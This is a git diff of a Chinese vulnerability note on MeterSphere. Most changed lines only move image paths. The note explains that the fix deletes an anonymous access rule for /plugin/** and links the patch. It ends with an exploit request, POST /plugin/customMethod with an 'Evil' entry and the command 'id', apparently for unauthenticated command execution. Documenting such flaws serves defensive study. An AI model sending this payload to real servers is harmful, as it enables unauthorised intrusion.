@@ -20,21 +20,21 @@ body="MeterSphere"
 
 登陆页面
 
-![image-20230424163040952](images/image-20230424163040952.png)
+![image-20230424163040952](../.gitbook/assets/image-20230424163040952.png)
 
 根据官方的修复可以看到目前版本的修复版本为删除代码片段
 
-filterChainDefinitionMap.put("/plugin/**", "anon");
+filterChainDefinitionMap.put("/plugin/\*\*", "anon");
 
 ```
 https://github.com/metersphere/metersphere/pull/9140/files
 ```
 
-![image-20230424163652968](images/image-20230424163652968.png)
+![image-20230424163652968](../.gitbook/assets/image-20230424163652968.png)
 
 查看文件 /backend/src/main/java/io/metersphere/controller/PluginController.java
 
-![image-20230424163710253](images/image-20230424163710253.png)
+![image-20230424163710253](../.gitbook/assets/image-20230424163710253.png)
 
 发送请求包
 
@@ -44,4 +44,4 @@ POST /plugin/customMethod
 {"entry":"Evil","request":"id"}
 ```
 
-![image-20230424163729245](images/image-20230424163729245.png)
+![image-20230424163729245](../.gitbook/assets/image-20230424163729245.png)
